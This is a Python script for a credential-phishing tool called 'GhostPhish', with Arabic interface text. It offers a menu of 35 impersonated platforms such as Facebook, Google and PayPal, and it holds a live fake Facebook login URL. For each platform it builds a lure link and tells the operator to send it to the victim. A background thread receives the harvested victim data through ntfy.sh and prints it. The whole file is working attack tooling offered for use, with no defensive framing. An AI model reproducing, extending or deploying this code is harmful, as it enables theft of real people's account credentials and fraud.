#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request
import urllib.parse
import json
import os
import uuid
import threading
import time
import sys

# ========== الألوان ==========
ORANGE = "\033[38;5;208m"
RED = '\033[91m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'
# =============================

CONFIG_FILE = "ghostphish_config.json"

# ─── الأسماء المعدلة (حذف الزوائد) ───
PLATFORMS = {
    1: "Facebook", 2: "Instagram", 3: "Google", 4: "Microsoft", 5: "Netflix",
    6: "Paypal", 7: "Steam", 8: "Twitter", 9: "Playstation", 10: "Tok",
    11: "Twitch", 12: "Pinterest", 13: "Snapchat", 14: "LinkedIn", 15: "Ebay",
    16: "Quora", 17: "Protonmail", 18: "Spotify", 19: "Reddit", 20: "Adobe",
    21: "DeviantArt", 22: "Badoo", 23: "Origin", 24: "DropBox", 25: "Yahoo",
    26: "Wordpress", 27: "Yandex", 28: "Stackover", 29: "Vk", 30: "XBOX",
    31: "Mediafire", 32: "Gitlab", 33: "Github", 34: "Discord", 35: "Roblox"
}

LINKS = {i: "" for i in range(1, 36)}
LINKS[1] = "https://facebook-vjj9.onrender.com"

COL_WIDTH = 26

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def load_or_create_secret():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            data = json.load(f)
            return data.get("secret", "")
    secret = "GhostPhish_" + uuid.uuid4().hex[:12]
    with open(CONFIG_FILE, "w") as f:
        json.dump({"secret": secret}, f)
    return secret

def fmt_entry(num, name):
    colored = f"{RED}[{WHITE}{num:02d}{RED}]{RESET} {ORANGE}{name}{RESET}"
    plain_len = len(f"[{num:02d}] {name}")
    padding = COL_WIDTH - plain_len
    if padding < 0:
        padding = 0
    return colored + " " * padding

def print_banner():
    banner = f"""{ORANGE}
   ______              __  ____  __    _     __
  / ____/__  ____  ____/ /_/ __ \/ /_  (_)___/ /_
 / / __/ _ \/ __ \/ ___/ __/ /_/ / __ \/ / __/ __/
/ /_/ /  __/ /_/ (__  ) /_/ ____/ / / / (__  ) / / /
\____/\___/\____/____/\__/_/   /_/ /_/_/____/_/ /_/
{RESET}"""
    print(banner)
    print()
    print(WHITE + "General : 1.0" + RESET)
    # ─── التعديل هنا ───
    print(WHITE + "[–] Tool Created by htr-tech (General)" + RESET)
    # ──────────────────
    print(WHITE + "[::] Select An Attack For Your Victim [::]" + RESET)
    print()
    print(ORANGE + "الشبح" + RESET)
    print()

def print_menu():
    for i in range(1, 11):
        col1 = fmt_entry(i, PLATFORMS[i])
        col2 = fmt_entry(i + 10, PLATFORMS[i + 10])
        col3 = fmt_entry(i + 20, PLATFORMS[i + 20])
        print(col1 + col2 + col3)

    print(fmt_entry(31, PLATFORMS[31]) + fmt_entry(32, PLATFORMS[32]) + fmt_entry(33, PLATFORMS[33]))
    print(fmt_entry(34, PLATFORMS[34]) + fmt_entry(35, PLATFORMS[35]))

    print(f"{RED}[{WHITE}00{RED}]{RESET} {WHITE}Exit{RESET}")
    print(WHITE + "[–] Select an option : " + RESET, end="")

def display_victim_data(message):
    print("\n" + WHITE + "═" * 40 + RESET)
    print(WHITE + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
    print(WHITE + "═" * 40 + RESET)
    lines = message.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if ':' in line:
            key, val = line.split(':', 1)
            print(f"{WHITE}{BOLD}{key.strip()}{RESET}: {WHITE}{val.strip()}{RESET}")
        else:
            print(f"{WHITE}{line}{RESET}")
    print(WHITE + "═" * 40 + RESET + "\n")

def listen_ntfy(topic):
    url = f"https://ntfy.sh/{topic}/json"
    while True:
        try:
            req = urllib.request.Request(url, headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=300) as response:
                for line in response:
                    if line:
                        try:
                            data = json.loads(line.decode('utf-8'))
                            if 'message' in data:
                                display_victim_data(data['message'])
                        except:
                            pass
        except Exception:
            time.sleep(5)

def main():
    secret = load_or_create_secret()
    clear_screen()
    print_banner()
    print(f"{WHITE}🔑 مفتاحك السري: {ORANGE}{secret}{RESET}")
    print()
    threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
    time.sleep(1)

    while True:
        print_menu()
        choice = input().strip()

        if choice == "00" or choice == "0":
            print(f"{WHITE}إيقاف الأداة...{RESET}")
            sys.exit(0)

        if choice.isdigit():
            num = int(choice)
            if 1 <= num <= 35:
                if LINKS[num] == "":
                    clear_screen()
                    print_banner()
                    print(f"{WHITE}❌ منصة {ORANGE}{PLATFORMS[num]}{WHITE} غير مفعلة بعد.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
                else:
                    link = LINKS[num] + "?topic=" + secret
                    clear_screen()
                    print_banner()
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{WHITE}✅ رابط {ORANGE}{PLATFORMS[num]}{WHITE}:{RESET}")
                    print(f"{ORANGE}{BOLD}{link}{RESET}")
                    print(WHITE + "═" * 40 + RESET)
                    print(f"{WHITE}انسخ الرابط وأرسله للضحية.{RESET}")
                    input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                    clear_screen()
                    print_banner()
            else:
                clear_screen()
                print_banner()
                print(f"{WHITE}رقم غير صحيح (استخدم 01-35 أو 00){RESET}")
                input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
                clear_screen()
                print_banner()
        else:
            clear_screen()
            print_banner()
            print(f"{WHITE}اختيار غير مفهوم{RESET}")
            input(f"{WHITE}اضغط Enter للرجوع...{RESET}")
            clear_screen()
            print_banner()

if __name__ == "__main__":
    main()
